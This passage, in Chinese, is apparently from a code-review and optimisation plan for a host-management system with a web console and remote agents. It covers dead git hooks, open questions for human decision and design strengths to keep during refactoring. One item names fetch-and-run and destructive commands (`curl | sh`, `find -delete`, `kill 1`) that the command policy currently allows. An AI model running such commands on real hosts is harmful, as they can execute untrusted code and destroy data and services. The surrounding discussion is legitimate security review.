实测：`git config core.hooksPath` → 未设；`.git/hooks` → 无生效钩子（仅 sample）。即 `web/.husky/pre-commit`（`pnpm exec lint-staged`）与 `web/.husky/commit-msg`（commitlint）**是死文件，从不执行**。叠加 Python 侧无 ruff/mypy/pytest-cov、Jenkins 侧缺 `skipped>0` 门槛（上轮 QR 已记），结论是：**目前任何「全绿」都是人工口头保证的**。这也正是你要求写进 AGENTS.md 那条协作规范的真实价值所在——它是唯一还没有落地的那一步。

---

## 7. 需人工裁决（不定这些，方案无法收尾）

1. **并发写入**：另一会话正在同一 worktree 逐页重写 `web/src/views/*`（Task 6 已合入审计页）。本轮优化要不要动 `web/` 业务页？四种处置见对话正文。
2. **本轮范围重心**：前四轮已产出 6 份评估/方案文档并修了大量条目。是把重心放在「一直没落地的前端测试 + 门禁」，还是同时做 `store.py` 拆分这种大手术？
3. **安全覆盖面口径**：`curl \| sh`、`systemctl stop`、`truncate`、`find -delete`、`kill 1` 现在都放行。内网运维工具要不要拦？拦了会不会打断真实安装脚本？（插件目录 root RCE 面同在此口径下）
4. **产品口径两处**：① 页面隐藏时是否继续轮询（QR29-W17）；② `caps` / `labels` / `custom` / `docker_*` 这些 v4 上报字段——UI 到底要不要呈现（QR29-S10 与 §5 前三行的根因是「上报了没人消费」）。
5. **设计缺口确认**：Agent「升上去就砖」是否需要启动健康门禁 + 自动回滚（QR29-A5）。

---

## 8. 亮点：重构时不许顺手改坏的东西

1. **三库方言单点收敛**（`Store._upsert` / `_ensure_schema` / `_column_ddl` + `_ADD_COLUMNS`/`_ADD_INDEXES` 清单化）+ `test_dialects` 的 compile 级回归锁——AGENTS.md 的这条纪律是这个仓库最强的资产，拆分 `store.py` 时不得把分支散回各处。
2. **读写分档**（`_SUMMARY_COLS`、`out_tail` 镜像列、`list_commands(tail=False)`、`_b64_tail` 的 4 字节对齐算术）——别退回整列拖取。
3. **筛选/排序单点构造 + 排序列白名单**（`_host_filters`/`_command_filters`/`_audit_filters`），保证 list/count/export 三者同语义；前端 `_CMD` 与后端 `_SORTS` 逐字对应。
4. **上行帧统一白名单入口 + `AUDIT_THROTTLE` + `_result_locks` 有界回收 + result 归属校验/seq 幂等水位**；`deps.py` 的 router 级默认拒绝 + `_tri()` 三态归一。
5. **Agent 侧**：`StateBox` 读拷贝+写换引用、插件 exec/collect 挪到锁外、updater `_fail_lock`/`_update_lock` 分工；自更新「形态/目标/存在性校验全在下载落盘之前」+ `.kkbak` 回滚 + size→sha→HMAC（`compare_digest`）三段；`_pub` 不判 `is_connected` 短路、urgent QoS0 绕行终态、`MAX_QUEUED`/`MAX_PENDING` 显式内存预算。
6. **前端两个抽象**：`usePolls()` 的作用域清理与 `useSeq()` 的迟到包丢弃（「防叠请求」与「防盖界面」是两件事，不要合并）；「没读到 ≠ 服务端报了 0」这条红线（`kk.ts:38-41 nOr`）在 5 个页面被一致执行，`system/index.vue` 甚至给「后端新增计数器不许悄悄漏掉」写了兜底分支。
7. **前端无 `v-html`**：主机名一律走 VNode 文本节点（`kkConfirm.ts:37-52`、`update:170-191`），命令输出走 `<pre>{{ }}</pre>`；`cmdline` 刻意不落 URL。上轮那条「全仓唯一 HTML 注入 sink 吃 Agent 自报主机名」确实已经修掉了。
8. **全静态菜单**（`router/modules/kk.ts` + `api/routes.ts:9` 返回 `[]`）与 `detail` 页唯一一处正确的 ECharts 生命周期（按需注册 + `onBeforeUnmount` dispose + `useResizeObserver`）。
